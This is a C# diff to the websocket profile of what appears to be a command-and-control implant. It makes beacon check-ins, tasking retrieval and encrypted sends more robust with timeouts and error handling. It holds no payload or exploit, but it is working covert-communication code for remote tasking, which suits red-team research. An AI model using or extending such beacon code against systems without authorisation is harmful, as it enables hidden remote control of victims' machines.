@@ -20,10 +20,14 @@ namespace Agent.Profiles.Websocket
         public int connectAttempt { get; set; }    
         public int maxAttempts { get; set; }
         private WebsocketClient _client { get; set; }
+        private Func<Task> startClient;
+        private Func<bool> clientIsRunning;
+        private TimeSpan connectionTimeout = TimeSpan.FromSeconds(30);
         private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
         public event EventHandler<TaskingReceivedArgs>? SetTaskingReceived;
         private bool checkedIn = false;
         private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
+        private static readonly TimeSpan CheckinResponseTimeout = TimeSpan.FromSeconds(30);
         private CheckinResponse? cir;
         public Websocket(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
         {
@@ -71,21 +75,11 @@ namespace Agent.Profiles.Websocket
 
 
             this._client = new WebsocketClient(new Uri(this.url), factory);
+            startClient = () => _client.Start();
+            clientIsRunning = () => _client.IsRunning;
             this._client.MessageReceived.Subscribe(msg =>
             {
-                WebSocketMessage wm = JsonSerializer.Deserialize<WebSocketMessage>(msg.Text, WebsocketJsonContext.Default.WebSocketMessage);
-
-                if (!checkedIn)
-                {
-                    cir = JsonSerializer.Deserialize(this.crypt.Decrypt(wm.data), CheckinResponseJsonContext.Default.CheckinResponse);
-                    checkinAvailable.Set();
-                    return;
-                }
-
-                GetTaskingResponse gtr = JsonSerializer.Deserialize(this.crypt.Decrypt(wm.data), GetTaskingResponseJsonContext.Default.GetTaskingResponse);
-                TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
-
-                SetTaskingReceived(this, tra);
+                HandleInboundMessage(msg.Text);
             });
 
 
@@ -95,34 +89,93 @@ namespace Agent.Profiles.Websocket
             this._client.DisconnectionHappened.Subscribe(info => {
             
             });
-            this._client.Start().Wait();
-
         }
+
+        private void HandleInboundMessage(string content)
+        {
+            try
+            {
+                WebSocketMessage? wm = JsonSerializer.Deserialize(content, WebsocketJsonContext.Default.WebSocketMessage);
+                if (wm is null)
+                {
+                    return;
+                }
+
+                string plaintext = this.crypt.Decrypt(wm.data);
+                if (!checkedIn)
+                {
+                    CheckinResponse? response = JsonSerializer.Deserialize(plaintext, CheckinResponseJsonContext.Default.CheckinResponse);
+                    if (!CheckinResponseValidation.IsSuccessful(response))
+                    {
+                        return;
+                    }
+
+                    cir = response;
+                    checkinAvailable.Set();
+                    return;
+                }
+
+                GetTaskingResponse? gtr = JsonSerializer.Deserialize(plaintext, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
+                if (gtr?.action != "get_tasking")
+                {
+                    return;
+                }
+
+                TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
+                SetTaskingReceived?.Invoke(this, tra);
+            }
+            catch
+            {
+                // A malformed peer message must not fault the receive subscription.
+            }
+        }
+
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
+            bool sent = false;
             do
             {
                 if (await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin)))
                 {
+                    sent = true;
                     break;
                 }
 
                 this.connectAttempt++;
             } while (this.connectAttempt <= this.maxAttempts);
 
-            checkinAvailable.Wait();
+            if (!sent)
+            {
+                return new CheckinResponse { status = "failed" };
+            }
+
+            if (!await WaitForCheckinResponse(checkinAvailable, CheckinResponseTimeout, cancellationTokenSource.Token))
+            {
+                return new CheckinResponse { status = "failed" };
+            }
 
             this.checkedIn = true;
 
-
-            return this.cir;
+            return this.cir!;
         }
+
+        private static Task<bool> WaitForCheckinResponse(
+            ManualResetEventSlim signal,
+            TimeSpan timeout,
+            CancellationToken cancellationToken) =>
+            CheckinResponseWait.WaitAsync(signal, timeout, cancellationToken);
         public async Task StartBeacon()
         {
-            this.cancellationTokenSource = new CancellationTokenSource();
             while (!cancellationTokenSource.Token.IsCancellationRequested)
             {
-                await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);
+                try
+                {
+                    await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000, cancellationTokenSource.Token);
+                }
+                catch (OperationCanceledException) when (cancellationTokenSource.IsCancellationRequested)
+                {
+                    break;
+                }
 
                 if (!this.messageManager.HasResponses())
                 {
@@ -130,7 +183,10 @@ namespace Agent.Profiles.Websocket
                 }
                 try
                 {
-                    await this.Send(messageManager.GetAgentResponseString());
+                    bool delivered = await messageManager.DeliverAsync(
+                        this.Send,
+                        result => result);
+                    this.connectAttempt = delivered ? 0 : this.connectAttempt + 1;
                 }
                 catch (Exception e)
                 {
@@ -152,30 +208,51 @@ namespace Agent.Profiles.Websocket
         }
         private async Task<bool> Send(string json)
         {
-            try
-            {
-                if (this._client.IsRunning)
-                {
-                    json = this.crypt.Encrypt(json);
-
-                    WebSocketMessage m = new WebSocketMessage()
-                    {
-                        client = true,
-                        data = json,
-                        tag = String.Empty
-                    };
-
-                    string message = JsonSerializer.Serialize(m, WebsocketJsonContext.Default.WebSocketMessage);
-
-                    this._client.Send(message);
-                }
-            }
-            catch
-            {
+            if (!await EnsureStarted())
                 return false;
-            }
 
+            json = this.crypt.Encrypt(json);
+            WebSocketMessage m = new WebSocketMessage()
+            {
+                client = true,
+                data = json,
+                tag = String.Empty
+            };
+            string message = JsonSerializer.Serialize(m, WebsocketJsonContext.Default.WebSocketMessage);
+            await this._client.SendInstant(message);
             return true;
         }
+
+        private async Task<bool> EnsureStarted()
+        {
+            if (clientIsRunning())
+            {
+                return true;
+            }
+
+            Task operation = startClient();
+            try
+            {
+                await operation.WaitAsync(connectionTimeout, cancellationTokenSource.Token);
+                return clientIsRunning();
+            }
+            catch (TimeoutException)
+            {
+                ObserveFault(operation);
+                return false;
+            }
+            catch (OperationCanceledException)
+            {
+                ObserveFault(operation);
+                throw;
+            }
+        }
+
+        private static void ObserveFault(Task operation) =>
+            _ = operation.ContinueWith(
+                task => _ = task.Exception,
+                CancellationToken.None,
+                TaskContinuationOptions.OnlyOnFaulted | TaskContinuationOptions.ExecuteSynchronously,
+                TaskScheduler.Default);
     }
 }
